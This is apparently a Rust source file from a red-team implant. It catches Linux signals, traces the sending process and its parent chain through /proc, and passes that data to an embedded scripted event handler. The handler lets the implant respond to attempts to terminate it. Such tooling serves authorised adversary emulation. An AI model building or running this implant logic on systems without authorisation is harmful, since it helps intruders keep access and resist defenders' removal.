/*
 * Event callbacks that let eldritch functions run when the implant does certain tasks
 */
#[cfg(feature = "events")]
use eldritchv2::{
    Interpreter, Value,
    assets::std::{EmbeddedAssets, StdAssetsLibrary},
    conversion::ToValue,
};
#[cfg(feature = "events")]
use std::{
    collections::BTreeMap,
    sync::{Arc, OnceLock},
};

#[cfg(feature = "events")]
static EVENT_SCRIPT: OnceLock<Option<String>> = OnceLock::new();

#[cfg(all(feature = "events", target_os = "linux"))]
#[derive(Debug, Clone)]
struct Sender {
    pid: i32,
    command: String,
    args: Vec<String>,
    tty: String,
    parent: Option<Box<Sender>>,
}

#[cfg(all(feature = "events", target_os = "linux"))]
pub async fn catch_signals() {
    use signal_hook::consts::{
        SIGCHLD, SIGHUP, SIGINT, SIGQUIT, SIGTERM, SIGUSR1, SIGUSR2, SIGWINCH,
    };
    use signal_hook::iterator::SignalsInfo;
    use signal_hook::iterator::exfiltrator::WithOrigin;
    use signal_hook::iterator::exfiltrator::origin::Origin;
    use tokio::sync::mpsc;

    // We send (Origin, Option<Sender>) to capture proc info immediately in the signal thread
    let (tx, mut rx) = mpsc::channel::<(Origin, Option<Sender>)>(32);

    // Spawn a dedicated thread for signal handling because the iterator is blocking
    std::thread::spawn(move || {
        let mut signals = match SignalsInfo::<WithOrigin>::new(&[
            SIGINT, SIGTERM, SIGHUP, SIGQUIT, SIGUSR1, SIGUSR2, SIGCHLD, SIGWINCH,
        ]) {
            Ok(s) => s,
            Err(e) => {
                #[cfg(debug_assertions)]
                eprintln!("Failed to register signals: {}", e);
                return;
            }
        };

        for info in &mut signals {
            let mut sender = None;
            // Attempt to read process info immediately to avoid race conditions
            if let Some(p) = info.process {
                sender = get_pid_info(p.pid, 15);
            }

            if tx.blocking_send((info, sender)).is_err() {
                break;
            }
        }
    });

    while let Some((info, sender)) = rx.recv().await {
        let sig = info.signal as i32;

        let sig_name = match sig {
            SIGINT => "sigint",
            SIGTERM => "sigterm",
            SIGHUP => "sighup",
            SIGQUIT => "sigquit",
            SIGUSR1 => "sigusr1",
            SIGUSR2 => "sigusr2",
            SIGCHLD => "sigchild",
            SIGWINCH => "sigwinch",
            _ => "unknown",
        };

        // Args that can passed to the event callback. "sender"
        let mut args: BTreeMap<String, Value> = BTreeMap::new();
        args.insert("signal".into(), sig_name.to_string().to_value());
        if let Some(s) = sender {
            args.insert("sender".into(), sender_to_value(&s));
        }

        // Actually spawn the event
        tokio::spawn(async move {
            on_event("on_signal", args).await;
        });
    }
}

#[cfg(all(feature = "events", not(target_os = "linux")))]
pub async fn catch_signals() {}

#[cfg(all(feature = "events", target_os = "linux"))]
fn sender_to_value(sender: &Sender) -> Value {
    use eldritchv2::conversion::ToValue;
    let mut map = BTreeMap::new();
    map.insert("pid".to_string(), (sender.pid as i64).to_value());
    map.insert("command".to_string(), sender.command.clone().to_value());
    map.insert("args".to_string(), sender.args.clone().to_value());
    map.insert("tty".to_string(), sender.tty.clone().to_value());

    if let Some(parent) = &sender.parent {
        map.insert("parent".to_string(), sender_to_value(parent));
    }

    map.to_value()
}

// Read the process calling tree for the kill command. Important if we want to take action
// against rough signals
#[cfg(all(feature = "events", target_os = "linux"))]
fn get_pid_info(pid: i32, max_rec: u32) -> Option<Sender> {
    if max_rec <= 0 {
        return None;
    } // Recursion loop

    // Read stat for comm, ppid, tty
    use std::io::Read;
    let path = format!("/proc/{}/stat", pid);
    let mut buffer = [0u8; 512];
    let mut file = std::fs::File::open(&path).ok()?;
    let n = file.read(&mut buffer).ok()?;
    let content = &buffer[..n];

    // Parse stat
    let end_of_comm = content.iter().rposition(|&b| b == b')')?;
    // comm is between the first '(' and the last ')'
    let start_of_comm = content.iter().position(|&b| b == b'(')? + 1;
    let command = String::from_utf8_lossy(&content[start_of_comm..end_of_comm]).into_owned();

    if end_of_comm + 2 >= content.len() {
        return None;
    }
    let rest = &content[end_of_comm + 2..];
    let mut iter = rest.split(|&b| b == b' ');

    iter.next(); // state
    let ppid_bytes = iter.next()?;
    let ppid_str = std::str::from_utf8(ppid_bytes).ok()?;
    let ppid: i32 = ppid_str.parse().ok()?;

    iter.next(); // pgrp
    iter.next(); // session

    let mut tty_str = String::new();
    if let Ok(link) = std::fs::read_link(format!("/proc/{}/fd/0", pid)) {
        tty_str = link.to_string_lossy().into_owned()
    }

    // Read cmdline for all args if the file still exists
    let mut args = Vec::new();
    if let Ok(mut cmdline_file) = std::fs::File::open(format!("/proc/{}/cmdline", pid)) {
        let mut cmdline_content = Vec::new();
        if cmdline_file.read_to_end(&mut cmdline_content).is_ok() {
            args = cmdline_content
                .split(|&b| b == 0)
                .filter(|s| !s.is_empty())
                .map(|s| String::from_utf8_lossy(s).into_owned())
                .collect();
        }
    }

    // Recurse for parent if depth allows
    let parent = if ppid > 0 {
        get_pid_info(ppid, max_rec - 1).map(Box::new)
    } else {
        None
    };

    Some(Sender {
        pid,
        command,
        args,
        tty: tty_str,
        parent,
    })
}

#[cfg(feature = "events")]
pub fn load_event_script() -> bool {
    let script = EVENT_SCRIPT.get_or_init(|| {
        let path = "on_event.eldritch";
        crate::assets::Asset::get(path).map(|f| String::from_utf8_lossy(&f.data).into_owned())
    });
    script.is_some()
}

#[cfg(feature = "events")]
pub async fn on_event(name: &str, args: BTreeMap<String, Value>) {
    // See if the event script exists

    use eldritchv2::conversion::ToValue;

    // Check for the universal event script
    let script_content = EVENT_SCRIPT.get().cloned().flatten();

    let content = match script_content {
        Some(s) => s,
        None => return,
    };

    #[cfg(debug_assertions)]
    log::info!(
        "Running event script 'on_event.eldritch' for event: {}",
        name
    );

    // Add event name to args
    let mut input_params: BTreeMap<String, Value> = BTreeMap::new();
    input_params.insert("event".to_string(), name.to_string().to_value());
    input_params.insert("args".to_owned(), args.to_value());
    // Embedded assets are exposed to the callbacks
    let asset_backend = Arc::new(EmbeddedAssets::<crate::assets::Asset>::new());
    let mut locker = StdAssetsLibrary::new();
    let _ = locker.add(asset_backend);
    // Execute using Eldritch V2 Interpreter
    let mut interpreter = Interpreter::new().with_default_libs();
    interpreter.register_lib(locker);
    interpreter.define_variable("input_params", input_params.to_value());

    match interpreter.interpret(&content) {
        Ok(_) => {}
        Err(_e) => {
            #[cfg(debug_assertions)]
            log::error!("Failed to execute event script: events/on_event.eldritch: {_e}");
        }
    }
}
